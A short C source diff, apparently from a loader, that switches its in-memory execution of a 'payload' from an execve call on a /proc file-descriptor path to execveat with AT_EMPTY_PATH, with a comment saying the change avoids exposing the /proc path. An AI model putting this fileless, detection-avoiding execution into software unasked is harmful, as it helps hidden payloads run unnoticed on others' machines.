@@ -62,12 +62,9 @@ static inline int memfd_create(const char *name, unsigned int flags) {
     return syscall(__NR_memfd_create, name, flags);
 }
 
-// Execute payload from memory using /proc/self/fd/<fd>
+// Execute payload from memory without exposing /proc path
 int exec_memfd(int fd, char **argv, char **envp) {
-    char path[BUF_SIZE];
-    snprintf(path, sizeof(path), "/proc/%d/fd/%d", getpid(), fd);
-    execve(path, argv, envp);
-    return -1;
+    return execveat(fd, "", argv, envp, AT_EMPTY_PATH);
 }
 
 int main(int argc, char **argv) {
